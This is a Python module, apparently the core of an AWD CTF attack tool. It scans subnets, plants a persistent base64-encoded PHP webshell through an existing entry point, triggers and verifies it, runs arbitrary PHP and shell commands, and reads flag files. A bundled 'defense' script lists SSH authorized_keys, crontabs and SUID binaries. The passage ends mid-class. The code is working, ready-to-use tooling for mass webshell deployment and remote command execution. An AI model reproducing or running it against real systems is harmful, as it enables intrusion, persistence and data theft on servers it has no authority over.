# -*- coding: utf-8 -*-
"""
AWD 工具 - 核心网络逻辑
=========================
写不死马 / 取 flag / 提交 flag / 网段扫描 / 批量命令的实现，不含任何界面代码。

v3.x 重点：
- 目标模型 Target：支持 ip / ip:port / http://ip:port，按目标而不是全局状态工作；
- 并发：run_batch() 统一批处理，扫描按块提交，避免一次堆几万个 future；
- 写马：代码执行模式优先 PHP 原生 file_put_contents，shell 只作兜底；
- 提交：表单用 parse_qsl + urlencode，支持同名参数替换；JSON 只支持对象；
- 判定：JSON code/msg > 成功关键字 > HTTP 状态，判不出就是"未知"，不再 200 即成功；
- flag：正则提取 + 多路径/多方式兜底；
- 命令台：exec_php / exec_shell / check_shell，供批量命令和健康巡检使用。

author : anglekat
"""

import base64
import itertools
import json
import re
import shlex
import socket
import threading
import time
from urllib.parse import (
    parse_qsl, urlencode, urlparse, urlunparse,
)

import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning

import config

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

MARK = 'angelkat'
FLAG_RE = re.compile(r'[A-Za-z0-9_]{1,32}\{[^}\r\n]{1,256}\}')
# 这些是状态/占位/错误输出，不是 flag；避免把 /flag 里的 not_started 当成 flag
_FLAG_STATUS_WORDS = {
    'not_started', 'notstarted', 'not-started',
    'not_found', 'notfound', 'not-found',
    'undefined', 'null', 'none', 'false', 'true',
    'error', 'disabled', 'pending', 'ready', 'started',
    'stopped', 'unknown', 'n/a', 'na',
    'flag', 'ctf', 'success', 'failed', 'ok', 'done',
    'yes', 'no', '0', '1',
}
_LOCAL = threading.local()
_BROWSER_UA = ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
               '(KHTML, like Gecko) Chrome/120.0 Safari/537.36')


# ======================================================================
# 会话 / 错误
# ======================================================================
def build_session():
    """构造一个复用的 session，并关闭代理，避免系统代理干扰内网请求"""
    session = requests.Session()
    session.trust_env = False
    session.max_redirects = 5
    session.headers.update({'User-Agent': _BROWSER_UA})
    return session


def get_session():
    """线程内复用的 session（并发批处理时每线程一个）"""
    session = getattr(_LOCAL, 'session', None)
    if session is None:
        session = build_session()
        _LOCAL.session = session
    return session


def classify_error(exc):
    """把网络异常归成一句人话"""
    if isinstance(exc, requests.exceptions.Timeout):
        return '超时'
    if isinstance(exc, requests.exceptions.SSLError):
        return 'TLS 错误'
    if isinstance(exc, requests.exceptions.ConnectionError):
        return '连接失败'
    if isinstance(exc, (requests.exceptions.InvalidURL,
                        requests.exceptions.MissingSchema,
                        requests.exceptions.InvalidSchema)):
        return 'URL 错误'
    if isinstance(exc, requests.exceptions.TooManyRedirects):
        return '重定向过多'
    text = str(exc).strip().replace('\n', ' ')
    if len(text) > 120:
        text = text[:120] + '…'
    return '%s: %s' % (type(exc).__name__, text or '未知错误')


# ======================================================================
# 目标模型
# ======================================================================
class Target(object):
    """一个目标：ip、端口、协议。port 为 None 表示使用默认端口。"""

    __slots__ = ('ip', 'port', 'scheme', 'line')

    def __init__(self, ip, port=None, scheme='http', line=None):
        self.ip = str(ip).strip()
        try:
            self.port = int(port) if port not in (None, '') else None
        except (TypeError, ValueError):
            self.port = None
        self.scheme = (scheme or 'http').lower()
        if line:
            self.line = line
        elif self.scheme == 'http':
            self.line = format_target(self.ip, self.port)
        else:
            self.line = '%s://%s' % (self.scheme,
                                     format_target(self.ip, self.port))

    @property
    def host(self):
        return format_target(self.ip, self.port)

    def __repr__(self):
        return 'Target(%r, %r, %r)' % (self.ip, self.port, self.scheme)

    def __eq__(self, other):
        return (isinstance(other, Target)
                and self.ip == other.ip
                and (self.port or 0) == (other.port or 0))

    def __hash__(self):
        return hash((self.ip, self.port or 0))


def format_target(ip, port=None):
    """ip + 端口 -> 展示/保存用的字符串；只隐藏 80（443 保留，便于区分 https）"""
    ip = str(ip).strip()
    try:
        port = int(port) if port not in (None, '') else None
    except (TypeError, ValueError):
        port = None
    if port and port != 80:
        return '%s:%d' % (ip, port)
    return ip


def target_key(target):
    """状态字典的 key：ip[:port]"""
    target = _as_target(target)
    return format_target(target.ip, target.port)


def ip_sort_key(value):
    """按 IP 数值排序；非法值排最后"""
    target = _as_target(value)
    try:
        nums = tuple(int(n) for n in target.ip.split('.'))
        return (0, nums, target.port or 0)
    except (TypeError, ValueError):
        return (1, (), target.port or 0)


def parse_target_line(line):
    """
    解析一行目标，支持：
        10.3.4.139
        10.3.4.139:8080
        10.3.4.139,8080
        http://10.3.4.139:8080
        https://10.3.4.139
    非法返回 None。
    """
    text = str(line or '').split('#', 1)[0].strip()
    if not text:
        return None
    scheme = 'http'
    if '://' in text:
        try:
            parsed = urlparse(text)
        except ValueError:
            return None
        scheme = (parsed.scheme or 'http').lower()
        text = parsed.netloc or parsed.path
    if scheme not in ('http', 'https'):
        return None
    port = None
    if ',' in text:
        text, _, port_text = text.rpartition(',')
        text = text.strip()
        port_text = port_text.strip()
        if not port_text.isdigit():
            return None
        port = int(port_text)
    else:
        # 只在“恰好一个冒号且右边是数字”时当端口，避免 IPv6 误判
        if text.count(':') == 1:
            host, _, port_text = text.partition(':')
            if port_text.isdigit():
                text, port = host, int(port_text)
    parts = text.split('.')
    if len(parts) != 4:
        return None
    for part in parts:
        if not part.isdigit() or not (0 <= int(part) <= 255):
            return None
    if port is not None and not (1 <= port <= 65535):
        return None
    return Target(text, port, scheme)


def parse_targets_text(text):
    """解析多行目标，返回 (targets, bad_lines)，按 ip:port 去重"""
    targets, bad, seen = [], [], set()
    for line in str(text or '').splitlines():
        raw = line.strip()
        if not raw or raw.startswith('#'):
            continue
        target = parse_target_line(raw)
        if not target:
            bad.append(raw)
            continue
        key = target_key(target)
        if key in seen:
            continue
        seen.add(key)
        targets.append(target)
    return targets, bad


def _as_target(value):
    """把 str / Target 统一成 Target"""
    if isinstance(value, Target):
        return value
    text = str(value or '').strip()
    target = parse_target_line(text)
    if target:
        return target
    return Target(text)


def parse_ip_field(text):
    """
    解析「我的 IP」输入，支持：
      10.3.4.139   -> 扫描同网段 10.3.4.1 ~ 10.3.4.254
      10.3.4.      -> 同上
      10.3.        -> 逐个子网扫描 10.3.b.c
      10.1.x.1     -> 固定第 1/2/4 段，第 3 段 1~254（* 同 x）
      10.1.1.x     -> 固定前三段，最后一段 1~254
    返回前缀/通配模式字符串，非法则返回 None。
    """
    text = str(text or '').strip()
    if not text or '..' in text or text.startswith('.'):
        return None
    parts = text.rstrip('.').split('.')
    if len(parts) not in (2, 3, 4):
        return None
    wildcard = any(p.lower() in ('x', '*') for p in parts)
    if wildcard:
        if len(parts) != 4:
            return None
        wild_count = 0
        for part in parts:
            if part.lower() in ('x', '*'):
                wild_count += 1
                continue
            if not part.isdigit() or not (0 <= int(part) <= 255):
                return None
        # 两段通配最多 254*254；三段通配太大，不支持
        if not (1 <= wild_count <= 2):
            return None
        return '.'.join('x' if p.lower() in ('x', '*') else p for p in parts)
    for part in parts:
        if not part.isdigit() or not (0 <= int(part) <= 255):
            return None
    if len(parts) == 4:
        return '.'.join(parts[:3]) + '.'
    return '.'.join(parts) + '.'


def iter_scan_ip(prefix, my_ip):
    """根据前缀/通配模式生成待扫描 IP 列表（跳过自己）"""
    prefix = str(prefix or '').strip()
    my_target = _as_target(my_ip)
    my_host = my_target.ip
    body = prefix.rstrip('.')
    segs = body.split('.')
    if any(seg.lower() in ('x', '*') for seg in segs):
        if len(segs) != 4:
            return []
        wild = [i for i, seg in enumerate(segs)
                if seg.lower() in ('x', '*')]
        result = []
        for values in itertools.product(range(1, 255), repeat=len(wild)):
            parts = list(segs)
            for idx, value in zip(wild, values):
                parts[idx] = str(value)
            ip = '.'.join(parts)
            if ip != my_host:
                result.append(ip)
        return result
    if prefix and not prefix.endswith('.'):
        prefix += '.'
    segs = prefix.strip('.').split('.')
    result = []
    if len(segs) == 3:
        for d in range(1, 255):
            ip = prefix + str(d)
            if ip != my_host:
                result.append(ip)
    else:
        for b in range(1, 256):
            for c in range(1, 255):
                ip = prefix + str(b) + '.' + str(c)
                if ip != my_host:
                    result.append(ip)
    return result


def url_of(target_ip, port=None):
    """按端口拼出目标根 URL（默认端口不显示在 URL 里）"""
    target = _as_target(target_ip)
    port = port if port not in (None, '') else (target.port or config.目标端口)
    try:
        port = int(port)
    except (TypeError, ValueError):
        port = None
    host = target.ip
    if port and not ((target.scheme == 'http' and port == 80)
                     or (target.scheme == 'https' and port == 443)):
        host = '%s:%d' % (target.ip, port)
    return '%s://%s' % (target.scheme or 'http', host)


# ======================================================================
# 网段扫描
# ======================================================================
def _tcp_open(ip, port, timeout):
    """TCP 连接探测：端口开放即视为存活"""
    try:
        with socket.create_connection((ip, int(port)), timeout=timeout):
            return True
    except (OSError, ValueError):
        return False


def probe_target(target, timeout=None):
    """
    对单个目标做 TCP 存活探测，返回 (alive, detail)。
    用于“目标 IP”页的「测试存活」：只测 ip:port 是否可连接，不发送 HTTP。
    """
    target = _as_target(target)
    port = target.port
    if not port:
        port = 443 if (target.scheme or 'http') == 'https' else 80
    try:
        port = int(port)
    except (TypeError, ValueError):
        port = 80
    timeout = float(timeout or config.扫描超时)
    if _tcp_open(target.ip, port, timeout):
        return True, 'TCP %s:%d 可连接' % (target.ip, port)
    return False, 'TCP %s:%d 连接失败/超时' % (target.ip, port)


def scan_hosts(prefix, my_ip, progress=None, stop_flag=None, timeout=None,
               workers=None, port=None):
    """
    并发探测哪些 IP 的 web 端口可访问，返回存活 IP 列表。
    - 按块提交任务，最多 workers*4 个 future，避免 /16 扫描时堆 6 万个任务；
    - progress(done, total) 最多回调约 100 次，避免把 UI 事件队列打爆。
    """
    from concurrent.futures import ThreadPoolExecutor, as_completed

    timeout = float(timeout or config.扫描超时)
    workers = max(1, int(workers or config.并发数))
    port = port if port not in (None, '') else config.目标端口
    try:
        port = int(port)
    except (TypeError, ValueError):
        port = 80

    segs = str(prefix or '').strip().rstrip('.').split('.')
    wildcard = any(s.lower() in ('x', '*') for s in segs)
    if wildcard:
        if len(segs) != 4:
            return []
        for s in segs:
            if s.lower() in ('x', '*'):
                continue
            if not s.isdigit() or not (0 <= int(s) <= 255):
                return []
    elif (len(segs) not in (2, 3)
          or not all(s.isdigit() and 0 <= int(s) <= 255 for s in segs)):
        return []
    targets = iter_scan_ip(prefix, my_ip)
    total = len(targets)
    alive, done = [], 0
    step = max(1, total // 100)
    chunk_size = max(workers * 4, 32)
    stopped = False

    with ThreadPoolExecutor(max_workers=workers) as pool:
        for start in range(0, total, chunk_size):
            if stop_flag is not None and stop_flag():
                stopped = True
                break
            chunk = targets[start:start + chunk_size]
            futures = {pool.submit(_tcp_open, ip, port, timeout): ip for ip in chunk}
            for future in as_completed(futures):
                done += 1
                if stop_flag is not None and stop_flag():
                    for f in futures:
                        f.cancel()
                    stopped = True
                    break
                try:
                    if future.result():
                        alive.append(futures[future])
                except Exception:  # noqa: BLE001 - 单个探测失败不影响整体
                    pass
                if progress and (done == total or done % step == 0):
                    progress(done, total)
            if stopped:
                break

    if progress and done != total:
        progress(done, total)
    alive.sort(key=ip_sort_key)
    return alive


# ======================================================================
# URL / payload
# ======================================================================
def _has_port(host):
    """判断 host 是否已带端口（只处理 IPv4/域名）"""
    host = str(host or '')
    return host.count(':') == 1 and host.rsplit(':', 1)[1].isdigit()


def modify_host(url, new_host):
    """把 URL 里的主机名替换成 new_host，保留端口 / 用户名密码 / 路径"""
    parsed = urlparse(url)
    try:
        parsed_port = parsed.port
    except ValueError:
        parsed_port = None
    netloc = new_host
    if parsed.username:
        netloc = parsed.username
        if parsed.password:
            netloc += ':' + parsed.password
        netloc += '@' + new_host
    if parsed_port and not _has_port(new_host):
        netloc += ':' + str(parsed_port)
    return urlunparse(parsed._replace(netloc=netloc))


def apply_target(url, target):
    """
    把 URL 模板应用到目标：主机换成目标 IP，端口优先用 URL 里的，
    URL 没写端口时才用目标端口。
    """
    target = _as_target(target)
    url = str(url or '').strip()
    if '://' not in url:
        url = 'http://' + url
    parsed = urlparse(url)
    scheme = (parsed.scheme or target.scheme or 'http').lower()
    try:
        port = parsed.port
    except ValueError:
        raise ValueError('URL 端口不合法：%s' % url) from None
    if port is None and target.port:
        port = target.port
    netloc = target.ip
    if parsed.username:
        netloc = parsed.username
        if parsed.password:
            netloc += ':' + parsed.password
        netloc += '@' + target.ip
    if port and not ((scheme == 'http' and port == 80)
                     or (scheme == 'https' and port == 443)):
        netloc += ':' + str(port)
    return urlunparse(parsed._replace(scheme=scheme, netloc=netloc))


def base_from_url(url, target):
    """取 URL 模板应用到目标后的 scheme://host:port"""
    parsed = urlparse(apply_target(url, target))
    if not parsed.scheme or not parsed.netloc:
        return base_default(target)
    return '%s://%s' % (parsed.scheme, parsed.netloc)


def base_default(target):
    """没有 URL 模板时，按目标自己的 scheme/port 拼根 URL"""
    target = _as_target(target)
    scheme = target.scheme or 'http'
    port = target.port
    host = target.ip
    if port and not ((scheme == 'http' and port == 80)
                     or (scheme == 'https' and port == 443)):
        host = '%s:%d' % (target.ip, port)
    return '%s://%s' % (scheme, host)


def _php_single(text):
    return str(text).replace('\\', '\\\\').replace("'", "\\'")


def build_payload(code, path):
    """shell 命令：把代码 base64 解码后写到目标路径（兼容旧接口）"""
    encoded = base64.b64encode(str(code).encode('utf-8')).decode()
    return 'echo %s|base64 -d > %s' % (encoded, shlex.quote(str(path)))


def build_payload_shell(code, path):
    """同 build_payload，语义更明确的新名字"""
    return build_payload(code, path)


def build_payload_php(code, path):
    """PHP 代码：原生 file_put_contents 写文件，不依赖 shell_exec"""
    encoded = base64.b64encode(str(code).encode('utf-8')).decode()
    safe = _php_single(path)
    return ("@mkdir(dirname('%s'),0777,true);"
            "@file_put_contents('%s',base64_decode('%s'));") % (safe, safe, encoded)


def build_payload_php_shell(code, path):
    """PHP 代码兜底：file_put_contents 被禁时，用 system 调 shell 写"""
    cmd = build_payload_shell(code, path)
    encoded = base64.b64encode(cmd.encode('utf-8')).decode()
    return "@system(base64_decode('%s'));" % encoded


def parse_headers(text):
    """解析自定义请求头：Key: Value，多行或 | 分隔；Cookie 里的分号保留"""
    if isinstance(text, dict):
        return {str(k): str(v) for k, v in text.items() if str(k).strip()}
    headers = {}
    for line in str(text or '').replace('|', '\n').splitlines():
        line = line.strip()
        if not line or line.startswith('#'):
            continue
        if ':' not in line:
            continue
        key, _, value = line.partition(':')
        key = key.strip()
        value = value.strip()
        if key and value:
            headers[key] = value
    return headers


def send_boom(session, url, method, param_name, payload, timeout=None,
              extra_data=None, headers=None):
    """按 GET / POST 把 payload 打到目标入口 shell"""
    timeout = timeout or config.请求超时
    params = {param_name: payload} if method == 'GET' else None
    data = None
    if method != 'GET':
        data = {param_name: payload}
        if extra_data:
            data.update(extra_data)
    elif extra_data:
        params.update(extra_data)
    return session.request(method, url, params=params, data=data,
                           timeout=timeout, verify=False, headers=headers)


# ======================================================================
# 不死马
# ======================================================================
def _trigger_url(base):
    path = str(config.运行的不死马路径 or '').lstrip('/')
    return base.rstrip('/') + '/' + path


def trigger_busima(session, base, timeout=0.8, headers=None):
    """
    访问一次不死马，让它开始循环写马。
    真实 requests.Session + http 时用裸 socket 发完就关，避免等一个永不结束的响应；
    其他情况（单元测试的 fake session / https）退回普通 GET。
    """
    url = _trigger_url(base)
    parsed = urlparse(url)
    if (isinstance(session, requests.Session)
            and parsed.scheme == 'http' and parsed.hostname):
        try:
            sock = socket.create_connection(
                (parsed.hostname, parsed.port or 80), timeout=timeout)
            custom = ''
            for key, value in (headers or {}).items():
                if str(key).lower() in ('host', 'connection', 'content-length'):
                    continue
                safe = str(value).replace('\r', ' ').replace('\n', ' ')
                custom += '%s: %s\r\n' % (key, safe)
            request = ('GET %s HTTP/1.0\r\nHost: %s\r\n%s'
                       'Connection: close\r\n\r\n') % (
                parsed.path or '/', parsed.netloc, custom)
            sock.sendall(request.encode('utf-8'))
            sock.close()
            return True
        except OSError:
            pass
    try:
        resp = session.get(url, timeout=timeout, verify=False, stream=True,
                           headers=headers)
        if hasattr(resp, 'close'):
            resp.close()
        return True
    except requests.exceptions.RequestException:
        return False


def _shell_url(base):
    return (base.rstrip('/') + '/'
            + str(config.木马文件名 or '').lstrip('/'))


def verify_shell(session, base, timeout=None, retries=3, headers=None):
    """
    验证落地木马是否可用：POST `echo angelkat;`，看回显。
    先按新模板（pass 放 POST），失败再按旧模板（pass 放 GET query）试一次。
    返回 (ok, detail)。
    """
    timeout = timeout or config.请求超时
    url = _shell_url(base)
    detail = '无响应'
    for attempt in range(max(1, int(retries))):
        for pass_in in ('post', 'get'):
            if pass_in == 'post':
                data = {'pass': config.木马的pass密码,
                        config.木马密码: "echo '%s';" % MARK}
                params = None
            else:
                data = {config.木马密码: "echo '%s';" % MARK}
                params = {'pass': config.木马的pass密码}
            try:
                resp = session.post(url, data=data, params=params,
                                    timeout=timeout, verify=False,
                                    headers=headers)
            except requests.exceptions.RequestException as exc:
                detail = '%s（%s）' % (classify_error(exc), url)
                continue
            if resp.status_code == 200 and MARK in (resp.text or ''):
                return True, 'ok'
            if resp.status_code == 404:
                detail = '404 路径不对（%s）' % url
            elif resp.status_code == 200:
                detail = '200 但回显无标记（%s）' % url
            else:
                detail = 'HTTP %s（%s）' % (resp.status_code, url)
        if attempt + 1 < retries:
            time.sleep(0.15)
    return False, detail


def write_busima_ex(session, target, options):
    """
    向单台目标写入不死马，返回 (ok, detail)。
    options: url / url_type / pass_type / pass_word / code
    - 代码执行模式：先发 PHP 原生写文件，失败再发 system(shell) 兜底；
    - 命令执行模式：直接发 shell 命令；
    - 写完访问一次不死马触发，再验证落地木马。
    """
    target = _as_target(target)
    url_template = str(options.get('url') or '').strip()
    if not url_template:
        return False, '未填写木马 URL'
    code = options.get('code') or config.busima_default()
    if not code:
        return False, '不死马代码为空'
    path = str(config.不死马路径 or '').strip()
    if not path:
        return False, '不死马路径为空'

    entry_url = None
    base = None
    try:
        entry_url = apply_target(url_template, target)
        base = base_from_url(url_template, target)
    except ValueError as exc:
        return False, str(exc)
    param_name = str(options.get('pass_word') or 'cmd')
    method = 'GET' if 'GET' in str(options.get('pass_type') or '') else 'POST'
    php_mode = '代码执行' in str(options.get('url_type') or '')
    headers = parse_headers(options.get('headers') or {})

    if php_mode:
        payloads = [
            ('php', build_payload_php(code, path)),
            ('shell', build_payload_php_shell(code, path)),
        ]
    else:
        payloads = [('shell', build_payload_shell(code, path))]

    steps = [
        '写入路径：%s' % path,
        '最终马：%s -> %s' % (config.木马文件名, _shell_url(base)),
        '触发：%s' % _trigger_url(base),
    ]
    if headers:
        steps.insert(0, '请求头：%s' % ', '.join(headers.keys()))
    for mode, payload in payloads:
        steps.append('模式：%s' % mode)
        try:
            resp = send_boom(session, entry_url, method, param_name, payload,
                             headers=headers or None)
        except requests.exceptions.RequestException as exc:
            steps.append('入口请求：%s %s -> 入口请求失败：%s' % (
                method, entry_url, classify_error(exc)))
            continue
        resp_text = getattr(resp, 'text', '') or ''
        snippet = ' '.join(resp_text.split())[:160]
        steps.append('入口请求：%s %s -> HTTP %s，%d 字节%s' % (
            method, entry_url, getattr(resp, 'status_code', '?'),
            len(resp_text), ('，回显：' + snippet) if snippet else ''))
        triggered = trigger_busima(session, base, headers=headers or None)
        steps.append('触发请求：%s -> %s' % (
            _trigger_url(base), '已发送' if triggered else '失败'))
        ok, detail = verify_shell(session, base, retries=3,
                                  headers=headers or None)
        if ok:
            parsed = urlparse(base)
            config.木马协议 = parsed.scheme or 'http'
            config.木马端口 = str(parsed.port or '')
            return True, 'ok（%s）' % mode
        steps.append('验证失败：%s' % detail)
    return False, '\n'.join(steps)


def write_busima(session, target_ip, options):
    """兼容旧接口：返回 bool"""
    ok, _ = write_busima_ex(session, target_ip, options)
    if ok:
        config.不死马代码 = options.get('code') or config.不死马代码
    return ok


def _trojan_base(target_ip):
    """兼容旧接口：按写马时记住的协议/端口拼根 URL"""
    target = _as_target(target_ip)
    scheme = config.木马协议 or target.scheme or 'http'
    port = config.木马端口 or target.port
    try:
        port = int(port) if port not in (None, '') else None
    except (TypeError, ValueError):
        port = None
    host = target.ip
    if port and not ((scheme == 'http' and port == 80)
                     or (scheme == 'https' and port == 443)):
        host = '%s:%d' % (target.ip, port)
    return '%s://%s' % (scheme, host)


# ======================================================================
# 命令执行 / 取 flag
# ======================================================================
def exec_php(session, base, php_code, timeout=None):
    """
    在落地木马上执行一段 PHP 代码，返回 (text, error)。
    先 pass 放 POST；若代码里带 MARK 但回显没有，再按旧模板 pass 放 GET 重试。
    """
    if isinstance(base, Target):
        base = base_default(base)
    url = _shell_url(base)
    timeout = timeout or config.请求超时
    text = ''
    error = None

    for pass_in in ('post', 'get'):
        if pass_in == 'post':
            data = {'pass': config.木马的pass密码, config.木马密码: php_code}
            params = None
        else:
            data = {config.木马密码: php_code}
            params = {'pass': config.木马的pass密码}
        try:
            resp = session.post(url, data=data, params=params,
                                timeout=timeout, verify=False)
        except requests.exceptions.RequestException as exc:
            error = classify_error(exc)
            continue
        text = resp.text or ''
        if resp.status_code != 200:
            error = 'HTTP %s' % resp.status_code
            continue
        error = None
        if MARK not in php_code or MARK in text:
            return text, None
        # 带标记但没回显：可能是旧模板只认 GET pass，换一种再试
    return text, error


def exec_shell(session, base, cmd, timeout=None):
    """在落地木马上执行 shell 命令，返回 (输出, error)"""
    encoded = base64.b64encode(str(cmd).encode('utf-8')).decode()
    php = ("echo '%s';@system(base64_decode('%s'));echo '%s';"
           % (MARK, encoded, MARK))
    text, error = exec_php(session, base, php, timeout)
    if text is None:
        return '', error
    return between_markers(text), error


def between_markers(text):
    """取 echo MARK;...;echo MARK; 之间的内容"""
    text = text or ''
    parts = text.split(MARK)
    if len(parts) >= 3:
        return parts[-2]
    return text


def check_shell(session, base, timeout=None):
    """健康巡检：返回 (alive, detail)"""
    text, error = exec_php(session, base, "echo '%s';" % MARK, timeout)
    if error:
        return False, error
    if text and MARK in text:
        return True, 'ok'
    return False, '无回显'


DEFENSE_TIMEOUT = 8.0

DEFENSE_SCRIPT = r"""echo '###WEBSHELL###'
grep -rIl -e 'eval($_POST' -e 'assert($_POST' -e 'ignore_user_abort' -e 'base64_decode' /var/www /app 2>/dev/null | head -20
echo '###RECENT###'
find /var/www /app -name '*.php' -mmin -120 2>/dev/null | head -20
echo '###PHPINI###'
php -i 2>/dev/null | grep -E 'disable_functions|open_basedir'
echo '###FLAGPERM###'
ls -l /flag /flag.txt 2>/dev/null
id
echo '###UPLOAD###'
find /var/www /app -type d -name upload -ls 2>/dev/null | head -10
echo '###SUID###'
find / -xdev -perm -4000 -type f 2>/dev/null | head -20
echo '###CRON###'
crontab -l 2>/dev/null
ls -la /etc/cron* 2>/dev/null | head -20
echo '###SSHKEY###'
cat /root/.ssh/authorized_keys 2>/dev/null
cat /home/*/.ssh/authorized_keys 2>/dev/null
echo '###LISTEN###'
ss -antp 2>/dev/null | head -20
echo '###END###'"""


def _defense_sections(text):
    sections = {}
    current = None
    for line in str(text or '').splitlines():
        line = line.strip()
        if line.startswith('###') and line.endswith('###') and len(line) > 6:
            current = line.strip('#')
            sections[current] = []
            continue
        if current:
            sections[current].append(line)
    return {k: '\n'.join(v).strip() for k, v in sections.items()}


def _defense_findings(sections):
    findings = []
    webshell = sections.get('WEBSHELL', '')
    if webshell:
        findings.append(('严重', '可能的 webshell 文件', webshell))
    recent = sections.get('RECENT', '')
    if recent:
        findings.append(('注意', '最近 2 小时被修改的 PHP', recent))
    phpini = sections.get('PHPINI', '')
    if not phpini:
        findings.append(('提示', '未取到 PHP 配置（php 不存在或被禁用）', ''))
    else:
        if re.search(r'disable_functions\s*=>\s*(no value|$)', phpini,
                     re.I | re.M):
            findings.append(('注意', 'disable_functions 未设置', phpini))
        if re.search(r'open_basedir\s*=>\s*(no value|$)', phpini,
                     re.I | re.M):
            findings.append(('提示', 'open_basedir 未设置', ''))
    flagperm = sections.get('FLAGPERM', '')
    if re.search(r'^.{7}r', flagperm, re.M):
        findings.append(('严重', 'flag 可能对其他用户可读', flagperm))
    if 'uid=0' in flagperm:
        findings.append(('注意', '当前 shell 是 root', 'uid=0'))
    upload = sections.get('UPLOAD', '')
    if upload:
        findings.append(('提示', '存在 upload 目录（检查是否可写/可执行）', upload))
    suid = sections.get('SUID', '')
    if suid:
        findings.append(('提示', 'SUID 文件', suid))
    cron = sections.get('CRON', '')
    if cron:
        findings.append(('注意', '定时任务 / 计划任务', cron))
    sshkey = sections.get('SSHKEY', '')
    if sshkey:
        findings.append(('严重', '存在 SSH authorized_keys', sshkey))
    listen = sections.get('LISTEN', '')
    if listen:
        findings.append(('提示', '监听端口', listen))
    if not findings:
        findings.append(('正常', '未发现明显风险', ''))
    return findings


def defense_check(session, base, timeout=None):
    """在目标上跑一段防守自查脚本，返回结构化 findings（默认 8 秒超时）"""
    text, error = exec_shell(session, base, DEFENSE_SCRIPT,
                             timeout or DEFENSE_TIMEOUT)
    sections = _defense_sections(text)
    return {'error': error or '', 'sections': sections,
            'findings': _defense_findings(sections), 'raw': text or ''}


def defense_report(result, target=''):
    """把 defense_check 的结果转成可读文本"""
    lines = []
    if target:
        lines.append('目标：%s' % target)
    error = result.get('error') or ''
    if error:
        lines.append('错误：%s' % error)
    for level, title, detail in result.get('findings', []):
        lines.append('[%s] %s' % (level, title))
        if detail:
            for line in str(detail).splitlines()[:30]:
                lines.append('    ' + line)
    return '\n'.join(lines)


def extract_flag(text):
    """从命令输出里提取 flag；先剥掉 angelkat 标记，再按常见 flag 格式匹配"""
    text = re.sub(r'\x1b\[[0-9;]*[A-Za-z]', '', text or '')
    body = between_markers(text)
    match = FLAG_RE.search(body)
    if match:
        return match.group(0)
    for line in reversed(body.splitlines()):
        line = line.strip()
        if not line:
            continue
        low = line.lower()
        if low.startswith(('warning', 'notice', 'deprecated', 'fatal',
                           'parse error', 'stack trace', '<b>')):
            continue
        if line == MARK or low in _FLAG_STATUS_WORDS:
            continue
        # 兜底只接受“像 token 的单行”（字母/数字/下划线/连字符，至少 8 位），
        # 避免把 id、ls、find 之类的命令输出当成 flag 提交。
        if len(line) >= 8 and re.fullmatch(r'[A-Za-z0-9_-]+', line):
            return line
    return None


def parse_flag_text(text):
    """解析收件箱里的 flag：每行可有多个，支持整段文本里提取"""
    flags, seen = [], set()
    for line in str(text or '').splitlines():
        found = FLAG_RE.findall(line)
        if not found:
            line = line.strip()
            if (4 <= len(line) <= 256 and ' ' not in line
                    and line.lower() not in _FLAG_STATUS_WORDS
                    and re.fullmatch(r'[A-Za-z0-9_-]+', line)):
                found = [line]
        for flag in found:
            flag = flag.strip()
            if flag and flag not in seen:
                seen.add(flag)
                flags.append(flag)
    return flags


COMMON_FLAG_PATHS = ['/flag', '/flag.txt', '/root/flag', '/tmp/flag',
                     '/home/ctf/flag', '/flag/flag']


def _flag_read_php(paths):
    """生成按顺序读 flag 的 PHP，读出文件前先输出 PATH: 便于缓存命中路径"""
    arr = ','.join("'%s'" % _php_single(p) for p in paths)
    return ("echo '%s';"
            "foreach(array(%s) as $p){if(@is_file($p)){"
            "echo 'PATH:' . $p . \"\\n\";@readfile($p);}}"
            "foreach(glob('/flag*') as $p){"
            "echo 'PATH:' . $p . \"\\n\";@readfile($p);}"
            "foreach(glob('/root/flag*') as $p){"
            "echo 'PATH:' . $p . \"\\n\";@readfile($p);}"
            "foreach(glob('/tmp/flag*') as $p){"
            "echo 'PATH:' . $p . \"\\n\";@readfile($p);}"
            "echo '%s';") % (MARK, arr, MARK)


def fetch_flag_detail(session, base, cmd=None, timeout=None, known_paths=None):
    """
    取 flag，返回 (flag, detail, used_path)。
    used_path 是 PHP 原生读取命中的路径（可能为空），供 UI 缓存到 state.json。
    依次尝试：
      1. 用户配置的命令（system(base64_decode(cmd))）；
      2. PHP 原生读文件，已知路径优先，然后常见路径/glob；
      3. 固定 shell 命令 cat /flag* /root/flag*。
    """
    if isinstance(base, Target):
        base = base_default(base)
    cmd = str(cmd or 'cat /flag').strip()
    attempts = []

    # 1. 用户命令
    text, error = exec_shell(session, base, cmd, timeout)
    flag = extract_flag(text)
    if flag:
        return flag, 'ok（自定义命令）', ''
    snippet = ' '.join((text or '').split())[:100]
    attempts.append('命令：%s' % (error or (
        '无 flag（回显：%s）' % snippet if snippet else '无 flag')))

    # 2. PHP 原生读文件（已知路径优先）
    paths = []
    for path in (known_paths or []):
        path = str(path or '').strip()
        if path and path not in paths:
            paths.append(path)
    for path in COMMON_FLAG_PATHS:
        if path not in paths:
            paths.append(path)
    text, error = exec_php(session, base, _flag_read_php(paths), timeout)
    flag = extract_flag(text)
    if flag:
        found = re.findall(r'PATH:([^\r\n]+)', text or '')
        used = found[0].strip() if found else ''
        return flag, 'ok（原生读文件）', used
    attempts.append('原生路径：%s' % (error or '无 flag'))

    # 3. 固定 shell 兜底
    text, error = exec_shell(
        session, base, 'cat /flag* /root/flag* /tmp/flag* 2>/dev/null', timeout)
    flag = extract_flag(text)
    if flag:
        return flag, 'ok（通配符）', ''
    attempts.append('通配符：%s' % (error or '无 flag'))
    return None, '；'.join(attempts), ''


def fetch_flag_ex(session, base, cmd=None, timeout=None):
    """兼容接口：只返回 (flag, detail)"""
    flag, detail, _ = fetch_flag_detail(session, base, cmd, timeout)
    return flag, detail


def get_flag_at(session, base, cmd=None, timeout=None):
    """取 flag，返回字符串或 None"""
    flag, _ = fetch_flag_ex(session, base, cmd, timeout)
    return flag


def get_flag(session, target_ip, cmd):
    """兼容旧接口：用写马时记住的协议/端口取 flag"""
    return get_flag_at(session, _trojan_base(target_ip), cmd)


# ======================================================================
# 提交 flag
# ======================================================================
class Submission(object):
    """解析后的提交请求模板"""

    __slots__ = ('method', 'url', 'headers', 'body', 'is_json', 'is_form', 'raw')

    def __init__(self, method, url, headers, body, is_json, is_form, raw):
